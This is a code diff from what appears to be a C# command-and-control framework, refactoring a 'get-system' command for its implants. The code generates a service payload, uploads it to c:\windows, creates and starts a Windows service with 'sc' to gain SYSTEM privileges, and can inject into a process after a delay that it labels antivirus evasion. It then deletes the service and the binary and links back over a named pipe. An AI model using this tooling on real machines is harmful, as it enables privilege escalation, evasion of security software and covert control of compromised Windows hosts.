@@ -6,9 +6,11 @@ using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
 using Commander.Commands.Agent;
+using Commander.Commands.Scripted;
 using Commander.Executor;
 using Common;
 using Common.Payload;
+using Shared;
 using Spectre.Console;
 
 namespace Commander.Commands.Composite
@@ -22,7 +24,7 @@ namespace Commander.Commands.Composite
         public string service { get; set; }
         public bool inject { get; set; }
 
-        public int? injectDelay { get; set; }
+        public int injectDelay { get; set; }
 
         public string injectProcess { get; set; }
 
@@ -30,7 +32,7 @@ namespace Commander.Commands.Composite
 
 
     }
-    public class GetSystemCommand : CompositeCommand<GetSystemCommandOptions>
+    public class GetSystemCommand : ScriptCommand<GetSystemCommandOptions>
     {
         public override string Description => "Obtain system agent using Services";
         public override string Name => "get-system";
@@ -39,98 +41,90 @@ namespace Commander.Commands.Composite
         public override RootCommand Command => new RootCommand(this.Description)
         {
              new Option(new[] { "--verbose", "-v" }, "Show details of the command execution."),
-             new Option<string>(new[] { "--pipe", "-n" }, () => "local","Name of the pipe used to pivot."),
+             new Option<string>(new[] { "--pipe", "-n" }, () => "localsys","Name of the pipe used to pivot."),
              new Option<string>(new[] { "--file", "-f" }, () => null,"Name of payload."),
              new Option<string>(new[] { "--service", "-s" }, () => "syssvc","Name of service."),
              new Option<string>(new[] { "--path", "-p" }, () => "c:\\windows","Name of the folder to upload the payload."),
              new Option(new[] { "--inject", "-i" }, "Îf the payload should be an injector"),
-             new Option<int?>(new[] { "--injectDelay", "-id" },() => null, "Delay before injection (AV evasion)"),
+             new Option<int>(new[] { "--injectDelay", "-id" },() => 30, "Delay before injection (AV evasion)"),
              new Option<string>(new[] { "--injectProcess", "-ip" },() => null, "Process path used for injection"),
              new Option(new[] { "--x86", "-x86" }, "Generate a x86 architecture executable"),
         };
 
-        protected override async Task<bool> CreateComposition(CommandContext<GetSystemCommandOptions> context)
+        protected override void Run(ScriptingAgent<GetSystemCommandOptions> agent, ScriptingCommander<GetSystemCommandOptions> commander, ScriptingTeamServer<GetSystemCommandOptions> teamServer, GetSystemCommandOptions options, CommanderConfig config)
         {
-            var agent = context.Executor.CurrentAgent;
-            if(agent.Metadata.Integrity != "High")
+            if (agent.Metadata.Integrity != Shared.IntegrityLevel.High)
             {
-                context.Terminal.WriteError($"[X] Agent should be in High integrity context!");
-                return false;
+                commander.WriteError($"[X] Agent should be in High integrity context!");
+                return;
             }
 
-            //var endpoint = ConnexionUrl.FromString(agent.Metadata.EndPoint);
-            var endpoint = ConnexionUrl.FromString($"pipe://127.0.0.1:{context.Options.pipe}");
+            var endpoint = ConnexionUrl.FromString($"pipe://127.0.0.1:{options.pipe}");
 
-            var options = new PayloadGenerationOptions()
+            var payloadOptions = new PayloadGenerationOptions()
             {
                 Architecture =  agent.Metadata.Architecture == "x86" ? PayloadArchitecture.x86 : PayloadArchitecture.x64,
                 Endpoint = endpoint,
                 IsDebug = false,
-                IsVerbose = context.Options.verbose,
-                ServerKey = context.Config.ServerConfig.Key,
+                IsVerbose = options.verbose,
+                ServerKey = config.ServerConfig.Key,
                 Type = PayloadType.Service,
-                IsInjected = context.Options.inject
+                InjectionDelay = options.injectDelay,
+                IsInjected = options.inject,
+                InjectionProcess = options.injectProcess
             };
-            if (context.Options.injectDelay.HasValue)
-                options.InjectionDelay = context.Options.injectDelay.Value;
-            if (!string.IsNullOrEmpty(context.Options.injectProcess))
-                options.InjectionProcess = context.Options.injectProcess;
 
-            context.Terminal.WriteInfo($"[>] Generating Payload!");
-            var pay = context.GeneratePayloadAndDisplay(options, context.Options.verbose);
+            if (!string.IsNullOrEmpty(options.injectProcess))
+                payloadOptions.InjectionProcess = options.injectProcess;
+
+            commander.WriteInfo($"[>] Generating Payload!");
+            var pay = commander.GeneratePayload(payloadOptions, options.verbose);
             if (pay == null)
-            {
-                context.Terminal.WriteError($"[X] Generation Failed!");
-                return false;
-            }
+                commander.WriteError($"[X] Generation Failed!");
             else
-                context.Terminal.WriteSuccess($"[+] Generation succeed!");
+                commander.WriteSuccess($"[+] Generation succeed!");
 
+            commander.WriteLine($"Preparing to upload the file...");
 
-
-            context.Terminal.WriteLine($"Preparing to upload the file...");
-
-            var fileName = string.IsNullOrEmpty(context.Options.file) ? ShortGuid.NewGuid() + ".exe" : context.Options.file;
+            var fileName = string.IsNullOrEmpty(options.file) ? ShortGuid.NewGuid() + ".exe" : options.file;
             if (Path.GetExtension(fileName).ToLower() != ".exe")
                 fileName += ".exe";
 
-            string path = context.Options.path + (context.Options.path.EndsWith('\\') ? String.Empty : '\\') + fileName;
+            string path = options.path + (options.path.EndsWith('\\') ? String.Empty : '\\') + fileName;
 
-            var fileId = await context.UploadAndDisplay(pay, fileName, "Uploading Payload");
-            await context.CommModule.TaskAgentToDownloadFile(agent.Metadata.Id, fileId);
+            agent.Echo($"Downloading file {fileName} to {path}");
+            agent.Upload(pay, path);
+            agent.Delay(1);
+            agent.Echo($"Creating service");
+            agent.Shell($"sc create {options.service} binPath= \"{path}\"");
+            agent.Echo($"Starting service");
+            agent.Shell($"sc start {options.service}");
 
-            this.Step($"Downloading file {fileName} to {path}");
-            this.Dowload(fileName, fileId, path);
-            this.Delay(1);
-            this.Step($"Starting pivot {endpoint}");
-            this.StartPivot(endpoint);
-            this.Delay(1);
-            this.Step($"Creating service");
-            this.Shell($"sc create {context.Options.service} binPath= \"{path}\"");
-            this.Step($"Starting service");
-            this.Shell($"sc start {context.Options.service}");
-           
-            if (!context.Options.inject)
+            if (!options.inject)
             {
-                this.Step($"Removing service");
-                this.Shell($"sc delete {context.Options.service}");
-                this.Echo($"[!] Don't forget to remove service binary after use! : shell del {path}");
+                agent.Echo($"Removing service");
+                agent.Shell($"sc delete {options.service}");
+                agent.Echo($"[!] Don't forget to remove service binary after use! : shell del {path}");
             }
             else
             {
-                this.Step($"Waiting {options.InjectionDelay + 10}s to evade antivirus");
-                this.Delay(options.InjectionDelay + 10);
-                this.Step($"Removing service");
-                this.Shell($"sc delete {context.Options.service}");
-                this.Step($"Removing injector {path}");
-                this.Shell($"del {path}");
+                agent.Echo($"Waiting {options.injectDelay + 10}s to evade antivirus");
+                agent.Delay(options.injectDelay + 10);
+                agent.Echo($"Removing service");
+                agent.Shell($"sc delete {options.service}");
+                agent.Echo($"Removing injector {path}");
+                agent.Shell($"del {path}");
             }
-            
 
-            this.Echo($"[*] Execution done!");
-            this.Echo(Environment.NewLine);
+            agent.Echo($"[*] Execution done!");
+            agent.Echo(Environment.NewLine);
 
-            return true;
+            agent.Echo($"Linking to {endpoint}");
+            var targetEndPoint = ConnexionUrl.FromString($"rpipe://127.0.0.1:{options.pipe}");
+            agent.Link(targetEndPoint);
+
+            if (options.inject)
+                commander.WriteInfo($"Due to AV evasion, agent can take a couple of minutes to check-in...");
         }
     }
 }
